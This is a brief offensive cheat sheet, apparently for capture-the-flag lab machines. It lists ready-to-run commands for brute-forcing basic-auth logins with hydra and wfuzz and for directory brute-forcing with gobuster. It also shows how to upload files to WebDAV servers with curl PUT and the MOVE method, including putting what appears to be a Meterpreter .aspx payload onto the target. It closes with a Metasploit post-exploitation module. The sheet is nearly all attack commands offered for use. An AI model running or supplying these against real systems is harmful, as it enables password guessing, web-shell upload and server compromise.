# web-payload  
Portal for any payload  
## Brute force web application 
### Basic Authentication  
`hydra -L usernames -P passwords -s 8080 -f <domain> http-get /`  
`wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt`  
***to enumerate every subdoamin there has to be an entry for that subdomain in /etc/hosts that points to the ip of the box , that’s why I added the HOST HTTP header (-H "HOST:FUZZ.redcross.htb") , it solves the problem.***  
## Directory Bruteforcing
`gobuster -w <Wordlist> -u http://10.10.10.15 -t 50 -x aspx,txt,html  `  
## WebDav
`davtest -url http://<IP>`  
### Manual  
```
echo 0xdf > test.txt  
root@kali# curl -X PUT http://10.10.10.15/df.txt -d @test.txt  
root@kali# curl http://10.10.10.15/df.txt  
```
or  
  
`curl -X PUT http://10.10.10.15/df.aspx -d @test.txt`  
  
### Manual for MOVE Method  
```
curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt  
curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx 
```
  
## Metasploit post exploitation
`post/multi/recon/local_exploit_suggester`  
